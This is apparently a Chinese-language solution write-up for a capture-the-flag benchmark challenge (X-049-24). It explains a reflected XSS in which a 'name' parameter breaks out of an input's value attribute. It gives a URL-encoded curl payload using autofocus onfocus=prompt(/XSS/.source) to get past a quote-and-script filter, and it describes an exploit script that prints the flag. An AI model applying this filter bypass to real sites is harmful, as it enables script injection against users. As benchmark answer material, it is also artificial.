# X-049-24 利用说明（XSS：属性闭合 + onfocus 提示框）

## 漏洞原理
- 入口：`GET /page?name=...`，后端将 `name` 作为 `value="{name}"` 注入到 `<input>` 的 `value` 属性中（未转义）。
- 过滤：只做两件事：
  - 移除带引号的 `"XSS"` 或 `'XSS'`（正则 `["']XSS["']`，忽略大小写）。
  - 删除 `<script ...>` 标签。
- 结果：可通过插入一个 `"` 先闭合 `value`，再追加 `autofocus onfocus=...` 事件属性实现 XSS。
- 校验：PhantomJS 会主动对带 `[autofocus]/[onfocus]` 的元素派发 `focus` 事件；若弹框文本严格等于 `XSS` 则返回 flag。

## 直接命令

```bash
curl "http://ip32812/page?name=%22%20autofocus%20onfocus%3Dprompt%28%2FXSS%2F.source%29%20x%3D%22"
# 返回页面含：Here is the flag: FLAG{...}
```

说明：这里用 `prompt(/XSS/.source)` 生成无引号的 XSS 文本，绕过对 `"XSS"`/`'XSS'` 的删除。

## 一键脚本（exp.py）
- 路径：`benchmarks/X-049-24/exp.py`
- 依赖：`pip install requests`
- 用法：

```bash
python3 benchmarks/X-049-24/exp.py              # 默认 http://ip32812
python3 benchmarks/X-049-24/exp.py http://host:port
```

- 行为：向 `/page` 发送 `name=" autofocus onfocus=prompt(/XSS/.source) x="`，解析返回页面并打印 `FLAG{...}`。

## 参考代码
- `src/app.py:64-76`（过滤逻辑 + 注入位置）
- `src/check.js`（PhantomJS 主动触发 focus + 捕获弹窗）
- `src/constants.py`（页面模板结构）

